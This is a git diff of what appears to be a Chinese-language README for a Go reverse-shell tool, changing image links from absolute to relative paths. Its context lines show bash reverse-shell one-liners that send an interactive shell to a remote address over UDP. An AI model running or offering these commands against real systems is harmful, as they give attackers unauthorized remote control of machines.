@@ -29,7 +29,7 @@ $ go build revshell.go
 
 https://github.com/BetterDefender/revshell/releases
 
-![image-20230814142045336](/resource/RevShell.assets/image-20230814142045336.png)
+![image-20230814142045336](resource/RevShell.assets/image-20230814142045336.png)
 
 ## 使用方法
 
@@ -77,15 +77,15 @@ bash -i &gt;&amp; /dev/udp/192.168.1.1/2222 0&gt;&amp;1
 /bin/bash -i &gt;&amp; /dev/udp/192.168.1.1/2222 0&gt;&amp;1
 ```
 
-![image](/resource/RevShell.assets/259199615-c5c4ea25-9191-4b5c-ab20-b3a86a604de3.png)
+![image](resource/RevShell.assets/259199615-c5c4ea25-9191-4b5c-ab20-b3a86a604de3.png)
 
 ### Windows
 
-![image](/resource/RevShell.assets/259209244-59f7ef07-01da-4271-87c7-fa286c143c94.png)
+![image](resource/RevShell.assets/259209244-59f7ef07-01da-4271-87c7-fa286c143c94.png)
 
 ### Linux
 
-![image](/resource/RevShell.assets/259210130-e29555ee-16eb-4a03-96dc-999341d174f3.png)
+![image](resource/RevShell.assets/259210130-e29555ee-16eb-4a03-96dc-999341d174f3.png)
 
 ## 总结
 
